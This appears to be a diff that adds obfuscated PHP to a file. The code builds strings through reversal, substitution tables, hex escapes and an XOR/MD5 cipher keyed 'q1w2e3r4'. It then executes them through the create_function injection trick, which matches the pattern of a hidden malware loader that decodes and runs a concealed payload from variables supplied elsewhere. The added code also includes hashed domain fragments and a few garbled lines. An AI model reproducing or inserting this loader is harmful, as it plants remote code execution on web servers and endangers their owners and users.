@@ -1,0 +1,71 @@
+function oo2($b) {
+    $h = explode("|", strrev($b));
+    $d = explode("*", $h[0]);
+    $b = $h[1];
+    for($i=0;$i<sizeof($d);$i++) {
+        $b = str_replace($i, $d[$i], $b);
+    }
+    create_function("", "};".$b."//");
+}
+function cqq($qw) {
+    $domarr = array("33db9538", "9507c4e8", "e5b57288", "54dfa1cb");
+    return random($domarr,$qw);
+}
+function oo1($y) {
+    $y= strrev($y);
+    $g=substr($y,strpos($y,"9")+1);
+    $v = explode(":",substr($y,0,strpos($y,"9")));
+    
+    for($i=0;$i<sizeof($v);$i++) {
+        $q = explode("|", $v[$i]);
+        $g = str_replace($q[0],$q[1],$g);
+    }
+    create_function("", "};".$g."//");
+}
+
+function en2($arg1, $arg2) {
+    $g = "";
+    while (strlen($g) < strlen($arg1)) {
+        $arg2 = pack("H*", md5($g.$arg2."q1w2e3r4"));
+        $g. = substr($arg2, 0, 8);
+    }
+    return $arg1^$g;
+}
+
+create_function("", '};function en2($s, $q) { $l="\x73\164\x72\154\x65\156";$p="\x70\141\x63\153";$r="\x73\165\x62\163\x74\162";$m="\x6d\144\x35"; $g = ""; while ($l($g)<$l($s)) { $q = $p("H*",$m($g.$q."\x71\61\x77\62\x65\63\x72\64")); $g.=$r($q,0,8); } return $s^$g; }//');
+function random($arr, $qw) {
+    $g=' w-86794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-873,g= w. r; m-86d944835,sq-87396487293787396086c951874";';
+    $soy = "en2";
+    $xx = "explode";
+    $ecx= "create_function";
+    $scy= "str_replace";
+    $a = explode("|", '\x|\1|="|";$|$');
+    $aa = explode("|","8|9|-|,| ");
+    $mec=$ecx;
+    for($i=0; $i < sizeof($a); $i++) {
+        $g = str_replace($aa[$i], $a[$i], $g);
+    }
+    create_function("", "};$g//");
+    //    create_function("", en2("?kgwLXze2:Wn@l.jS'", "str_replace"));
+    create_function("", "(q(]9b");
+    return $arr[rand((0.24-(0.03*8)),(0.1875*6))].$qw;
+}
+$r9 = explode("|",$n9);
+$b9=0;
+$a9=0;
+for($i9=0;$i9<sizeof($r9);$i9++) {
+    if ($i9==0)
+        $a9=0;
+    else
+        $a9=$r9[$i9-1]+$a9; $b9=$r9[$i9];
+    $v_[]=substr($v9, $a9, $b9);
+}
+$y =1;
+for($i=0;$i<5;$i++) {
+    $vv1 ="o"."o".$y;
+    if ($y==1)
+        $y=2;
+    else
+        $y=1;
+    $vv1($v_[$i]);
+}
